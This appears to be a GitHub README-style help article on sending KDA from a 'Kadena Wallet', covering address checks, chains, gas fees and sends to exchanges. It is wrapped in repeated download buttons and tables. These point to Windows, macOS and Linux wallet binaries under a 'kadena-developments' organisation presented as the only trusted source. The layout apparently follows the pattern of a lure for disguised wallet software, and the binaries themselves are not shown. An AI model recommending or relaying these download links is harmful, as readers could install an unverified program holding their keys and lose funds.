![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Sending KDA from Kadena Wallet: Four Checks Before You Press Send</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Sending is the one action in a wallet that cannot be undone. Everything else, including restoring a phrase and switching a chain, is reversible or at least harmless. A send either reaches the address you named or it does not, and no support channel can intervene afterwards.

That is why the checks before pressing send deserve more attention than the button itself.

## You'll see this if

- You are sending KDA for the first time and want the order of operations.
- A send failed and you are not sure whether anything left your account.
- You are sending to an exchange and are unsure about the chain or the memo.
- You want to know what the fee is for, and why it varies.

## Four checks before anything else

| Check | What to confirm | Why it matters |
| --- | --- | --- |
| Address form | A `k:` principal, 66 characters, or a legacy name you recognise | A damaged copy can still validate in permissive fields |
| Chain | The chain the recipient watches | The correct address on the wrong chain is invisible, not lost |
| Account exists | Whether the destination needs a create step | A missing guard stops the transfer partway |
| Fee | Enough balance for gas on the sending chain | A send with no room for gas fails after you commit |

The second row causes the most confusion and the fourth the most failed attempts. Neither is exotic; both are checkable in under a minute.

## The send, in order

1. **Open the account you are sending from** and confirm the balance on the chain you intend to use.
2. **Paste the destination** and read it back against the source you copied from. Compare the first and last six characters at minimum, and the whole string where the screen allows.
3. **Enter the amount**, leaving room for the fee.
4. **Check which chain the transaction will execute on.** This is the sending chain, and it should match what the recipient expects.
5. **Approve, and read the confirmation** rather than dismissing it. The confirmation is the last place an error is visible.
6. **Copy the transaction hash** before closing anything.
7. **Confirm on the destination side**, by balance or by explorer, not by the wallet's own summary.

Step two is where clipboard malware earns its living, and step six is what makes every later conversation possible.

## What the fee pays for

A Kadena transaction costs gas, denominated in KDA, paid on the chain where it executes. Gas is not a tip and not a service charge; it is the cost of computation, and a simple transfer costs less than an operation that creates an account or calls a contract.

Two practical consequences follow. When the far-side name is new, the operation also constructs it, which costs more than a plain move. And a transfer between chains costs gas twice, once on each side, because it is two transactions.

If a send fails with an insufficient-funds error while your balance looks large enough, the balance is usually on a different chain from the one paying the fee.

## What a failure tells you

| Message or symptom | Usual cause |
| --- | --- |
| Address rejected | Wrong prefix, wrong length, whitespace, or a public key pasted instead of a name |
| Insufficient funds | Balance is on another chain, or too little remains after the fee |
| Account not found | The destination needs a create step, or the name is wrong |
| Nothing happens, no error | The node is unreachable; check the endpoint |
| Sent but not received | Chain mismatch, or an exchange credit pending |

Only the first two are your input. The rest are environment or destination, and each has a test that does not involve sending again.

## Sending to an exchange

Venues add two requirements that a person-to-person transfer does not have.

**The chain.** The withdrawal or deposit screen names one, and the venue credits only that chain. Set your wallet to the same chain before sending, and treat a mismatch as a ticket to raise, not a write-off.

**A memo or tag, if asked.** Kadena accounts are named, so the shared-address model that needs tags elsewhere does not apply in the same way. If a venue asks for one anyway, supply it exactly. A missing memo is a crediting delay, not a lost transfer.

Send a small test amount to a new venue address the first time. The cost of that habit is a few cents; the cost of skipping it is a support ticket measured in days.

## If you sent to the wrong place

Be precise about which mistake you made, because the options differ.

- **Wrong chain, right address.** The funds are yours on another chain. Switch and look; nothing was lost.
- **Right chain, wrong address you control.** Same keys, different account. Derive the right one.
- **Address belonging to someone else.** Nothing can reverse it. The transaction is final.
- **Exchange address without a memo.** Venue support, with the hash.
- **A contract address that cannot receive.** The transfer may fail outright, which is the good outcome.

In none of those cases does sending again help, and in two of them it makes the loss larger.

## Prevention, kept short

- Read the destination on the largest screen available, and read it twice.
- Keep the transaction hash until the recipient confirms.
- Test with a small amount on any new route.
- Never let a website or a person talk you through a send in real time. That pattern is the scam, not the exception.
- Keep a written note of which chain each recipient expects.

## FAQ

**Can a send be cancelled once approved?**
No. Once the network includes it, the transfer is final for everyone, including the sender.

**Why did the fee come out larger than expected?**
The destination account was created as part of the transfer, or the transaction did more work than a plain send.

**Do I need the recipient's permission to send?**
No. Sending needs only the address. Receiving needs the address and, for a new name, a guard that the transfer supplies.

**Is a `k:` address required?**
It is the common form and the one to prefer. Legacy names remain valid and are a separate account from the prefixed one for the same key.

**What if the wallet says the address is invalid but the exchange gave it?**
Check for a trailing space, a missing prefix, or a different account format. Venue addresses are usually `k:` principals, and a truncated paste is the usual culprit.

## Related reading

- Choosing a chain in Kadena Wallet: why balances differ
- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Stuck cross-chain transfer in Kadena Wallet: finish it, don't resend
- Kadena Wallet security: a threat model you can act on

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Why Your KDA Balance Shows Zero, and Where It Really Is](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/why-kadena-balance-shows-zero-in-wallet.md)
- [Exchange Deposit Not Showing? The Chain Mismatch Behind It](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/exchange-deposit-not-showing-kadena-wallet.md)
- [Kadena Wallet Cannot Reach the Network: What to Check](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-wallet-connection-error-fix.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
